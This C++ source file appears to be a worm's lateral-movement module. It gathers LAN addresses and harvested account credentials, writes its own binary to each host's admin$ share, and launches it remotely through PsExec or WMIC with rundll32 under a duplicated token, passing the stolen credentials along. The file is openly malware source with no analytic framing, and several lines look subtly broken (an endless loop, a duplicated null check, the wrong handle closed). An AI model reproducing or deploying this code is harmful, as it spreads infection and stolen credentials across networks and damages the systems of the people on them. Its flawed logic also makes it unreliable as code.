#include "ZInfect.h"
#include "ZFilePath.h"
#include "ZNetwork.h"
#include "ZCollectAccount.h"
#include "ZString.h"
#include "ZFile.h"
#include "ZSystemCmd.h"

#include <Shlwapi.h>

BOOL SetAccountInfected(LPCWSTR lpUser, LPCWSTR lpPassword)
{
	WCHAR *pParam[2] = { NULL };
	pParam[0] = new WCHAR[wcslen(lpUser) + 1];
	wcscpy(pParam[0], lpUser);
	pParam[1] = new WCHAR[wcslen(lpPassword) + 1];
	wcscpy(pParam[1], lpPassword);

	BOOL bRet = g_pObj2->SetInfected(NULL, pParam);
	delete pParam[0];
	delete pParam[1];

	return bRet;
}

DWORD GeneralParamString(WCHAR *pszParam)
{
	WCHAR wcsSrc[1024] = { 0 };
	DWORD dwTime = GetRunTime();
	dwTime = dwTime < 10 ? 10 : dwTime;
	wsprintfW(wcsSrc, L"%d", dwTime);
	int nLen = wcslen(wcsSrc);

	EnterCriticalSection(&g_csCriticalSection);
	if (FALSE != g_bGetAccount)
	{
		GetAllAccount();
	}

	nLen += wcslen(g_szAccountInfo);
	if (nLen < 8190)
	{
		wcscat(pszParam, wcsSrc);
		wcscat(pszParam, g_szAccountInfo);
	}
	else
	{
		SetLastError(ERROR_INSUFFICIENT_BUFFER);
	}

	LeaveCriticalSection(&g_csCriticalSection);
	return nLen;
}

BOOL GeneralPsexecCommand(LPWSTR lpIP, LPWSTR lpApp, LPWSTR lpCMD)
{
	BOOL bRet = FALSE;
	lpApp[0] = 0;
	lpCMD[0] = 0;
	int nLen = 0;
	DWORD dwErrCode = 0;
	WCHAR wcsLastName[MAX_PATH] = { 0 };
	GetFileLastName(wcsLastName);
	if (g_pszDllhostPath)
	{
		nLen = wcslen(g_pszDllhostPath);
		if (nLen <= MAX_PATH)
		{
			wcscpy(lpApp, wcsLastName);
		}
	}
	else
	{
		dwErrCode = ERROR_PATH_NOT_FOUND;
	}

	SetLastError(dwErrCode);

	if ((0 != nLen) && (NULL != PathFileExistsW(lpApp)))
	{
		wsprintfW(lpCMD, L"%s \\\\%s -accepteula -s ", lpApp, lpIP);
		nLen += wsprintfW(lpCMD + nLen, L"-d C:\\Windows\\System32\\rundll32.exe \"C:\\Windows\\%s\",#1", wcsLastName);

		WCHAR wcsParam[8192] = { 0 };
		DWORD dwSize = GeneralParamString(wcsParam);
		if ((dwSize + 1) <= 8191)
		{
			nLen = dwSize + 1;
		}
		else
		{
			nLen = 8191;
		}

		memcpy(lpCMD + nLen, wcsParam, nLen * sizeof(WCHAR));
		bRet = TRUE;
	}
	else
	{
		lpApp[0] = 0;
		lpCMD[0] = 0;
	}
	return bRet;
}

BOOL GeneralCommand(LPWSTR lpIP, LPWSTR lpUser, LPWSTR lpPass, LPWSTR lpApp, LPWSTR lpCMD)
{
	BOOL bRet = FALSE;
	WCHAR wcsParam[8192] = { 0 };
	WCHAR wcsFileName[MAX_PATH] = { 0 };
	GetFileLastName(wcsFileName);

	if (GetSystemDirectoryW(lpApp, MAX_PATH))
	{
		PathAppendW(lpApp, L"wbem\\wmic.exe");
		if (PathFileExistsW(lpApp))
		{
			int nLen = wsprintfW(lpCMD, L"%s /node:\"%ws\" /user:\"%ws\" /password:\"%ws\"", lpApp, lpIP, lpUser, lpPass);
			wsprintfW(lpCMD + nLen, L"process call create \"C:\\Windows\\System32\rundll32.exe \"C:\\Windows\\%s\" #1 ", wcsFileName);
			GeneralParamString(wcsParam);
			
			for (int i = 0; TRUE; i++)
			{
				if (L'\"' == wcsParam[i])
				{
					wcsParam[i] = L'\\';
				}
			}
		}
		else
		{
			lpApp[0] = 0;
			lpCMD[0] = 0;
		}
	}

	return bRet;
}

BOOL PsexecInfected(WCHAR *pszIp, WCHAR *lpUserName, WCHAR *lpPassword, PDWORD pWNetRet)
{
	BOOL bRet = FALSE;
	DWORD dwErrCode = 0;
	DWORD dwWNetRetVal = 0;
	if (NULL != pszIp)
	{
		WCHAR wcsNetworkName[MAX_PATH] = { 0 };
		wsprintfW(wcsNetworkName, L"\\\\%s\\admin$", pszIp);

		WCHAR wcsFileLastName[MAX_PATH] = { 0 };
		GetFileLastName(wcsFileLastName);

		WCHAR wcsNetworkFileName[MAX_PATH];
		wsprintfW(wcsNetworkFileName, L"\\\\%ws\\admin$\\%ws", pszIp, wcsFileLastName);

		NETRESOURCEW tagNetResource = { 0 };
		tagNetResource.lpRemoteName = wcsNetworkName;
		tagNetResource.dwType = RESOURCEDISPLAYTYPE_DOMAIN;

		for (int i = 0; i < 2; i++)
		{
			dwWNetRetVal = WNetAddConnection2W(&tagNetResource, lpUserName, lpPassword, 0);

			WCHAR pszPath[1024] = { 0 };
			wsprintfW(pszPath, L"\\\\%ws\\admin$\\%ws", pszIp, wcsFileLastName);

			WCHAR *pExtension = PathFindExtensionW(pszPath);
			if (NULL != pExtension)
			{
				pExtension[0] = 0;
				if (PathFileExistsW(pszPath))
				{
					bRet = TRUE;
					WNetCancelConnection2W(wcsNetworkName, 0, TRUE);
					break;
				}
				dwErrCode = GetLastError();
			}

			if (ZWriteNormalFile(wcsNetworkFileName, g_bSelfFileData, g_dwSelfFileBufSize, TRUE))
			{
				if (NULL != lpUserName
					&& NULL != lpPassword)
				{
					SetAccountInfected(lpUserName, lpPassword);
					g_bGetAccount = TRUE;
				}

				HANDLE hTokenHandle = NULL;
				HANDLE hNewToken = NULL;
				if (OpenThreadToken(GetCurrentThread(), TOKEN_DUPLICATE, TRUE, &hTokenHandle))
				{
					DuplicateTokenEx(hTokenHandle, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hNewToken);
				}

				WCHAR wcsApplicationName[780] = { 0 };
				WCHAR wcsCommandLine[32768] = { 0 };
				for (i = 0; i < 2 && !bRet; i++)
				{
					STARTUPINFOW tagStartupInfo = { 0 };
					PROCESS_INFORMATION tagProcessInformation = { 0 };
					tagStartupInfo.cb = sizeof(STARTUPINFOW);
					tagStartupInfo.dwFlags = STARTF_USEPOSITION | STARTF_FORCEONFEEDBACK;
					if (0 == i)
					{
						GeneralPsexecCommand(pszIp, wcsApplicationName, wcsCommandLine);
					}

					if (1 == i)
					{
						if (NULL == lpPassword
							|| NULL == lpPassword)
						{
							break;
						}

						GeneralCommand(pszIp, lpUserName, lpPassword, wcsApplicationName, wcsCommandLine);
					}

					if (0 != wcsCommandLine[0]
						&& 0 != wcsApplicationName[0])
					{
						BOOL bCreate = FALSE;
						if (NULL != hNewToken)
						{
							bCreate = CreateProcessAsUserW(hNewToken, wcsApplicationName, wcsCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &tagStartupInfo, &tagProcessInformation);
						}
						else
						{
							bCreate = CreateProcessW(wcsApplicationName, wcsCommandLine, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &tagStartupInfo, &tagProcessInformation);
						}

						if (bCreate)
						{
							WaitForSingleObject(tagProcessInformation.hProcess, INFINITE);
							DWORD dwExitCode = 0;
							GetExitCodeProcess(tagProcessInformation.hProcess, &dwExitCode);
							if (NULL != tagStartupInfo.hStdError)
							{
								CloseHandle(tagStartupInfo.hStdError);
							}
							if (NULL != tagStartupInfo.hStdInput)
							{
								CloseHandle(tagStartupInfo.hStdInput);
							}
							if (NULL != tagStartupInfo.hStdOutput)
							{
								CloseHandle(tagStartupInfo.hStdOutput);
							}
							if (NULL != tagProcessInformation.hProcess)
							{
								CloseHandle(tagProcessInformation.hProcess);
							}
							if (NULL != tagProcessInformation.hThread)
							{
								CloseHandle(tagProcessInformation.hThread);
							}

							if (0 == i)
							{
								if (0 == dwExitCode
									&& dwExitCode & 3)
								{
									bRet = TRUE;
								}
								else
								{
									bRet = PathFileExistsW(pszPath);
								}
							}
							else if (1 == i)
							{
								bRet = dwExitCode ? FALSE : TRUE;
								if (FALSE == bRet)
								{
									bRet = PathFileExistsW(pszPath);
								}
							}
						}
						else
						{
							dwErrCode = GetLastError();
						}
					}
					else
					{
						dwErrCode = GetLastError();
					}
				}

				if (!bRet)
				{
					DeleteFileW(wcsNetworkFileName);
				}

				if (NULL != hNewToken)
				{
					CloseHandle(hNewToken);
				}
				if (NULL != hTokenHandle)
				{
					CloseHandle(hTokenHandle);
				}

				if (0 == dwWNetRetVal)
				{
					WNetCancelConnection2W(wcsNetworkName, 0, TRUE);
				}
				break;
			}
			else
			{
				dwErrCode = GetLastError();
				if (ERROR_FILE_EXISTS == dwErrCode
					|| ERROR_BAD_NETPATH == dwErrCode
					|| ERROR_BAD_NET_NAME == dwErrCode
					|| ERROR_SESSION_CREDENTIAL_CONFLICT != dwWNetRetVal)
				{
					if (0 == dwWNetRetVal)
					{
						WNetCancelConnection2W(wcsNetworkName, 0, TRUE);
					}
					break;
				}
				if (0 == i)
				{
					WNetCancelConnection2W(wcsNetworkName, 0, TRUE);
				}
			}
		}

	}
	else
	{
		dwErrCode = ERROR_INVALID_PARAMETER;
	}

	if (NULL != pWNetRet)
	{
		*pWNetRet = dwWNetRetVal;
	}
	SetLastError(dwErrCode);
	return bRet;
}

DWORD __stdcall PsexecInfectLAN(LPVOID pParam)
{
	HANDLE hToken = NULL;
	HANDLE hNewToken = NULL;
	if (OpenThreadToken(GetCurrentThread(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, TRUE, &hToken))
	{
		DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenImpersonation, &hNewToken);
	}
	CZVector *pVecInfectIP = new CZVector(0x24, x_StrCmpIW, NULL, 65535);
	CollectLANIP(pVecInfectIP, NULL);
	GetOtherUserAcc(pVecInfectIP);
	pVecInfectIP->SetCollectComplete();

	WCHAR szInfectIp[16] = { 0 };
	CZVector::iterator *it = pVecInfectIP->GetString(szInfectIp);
	do
	{
		if (PsexecInfected(szInfectIp, NULL, NULL, NULL))
		{
			pVecInfectIP->SetInfected(it, szInfectIp);
			g_pObj1->SetInfected(NULL, szInfectIp);
		}
	} while (pVecInfectIP->GetString(it, szInfectIp));
	delete it;

	if (hToken)
	{
		CloseHandle(hToken);
	}

	if (hNewToken)
	{
		CloseHandle(hToken);
	}

	return 0;
}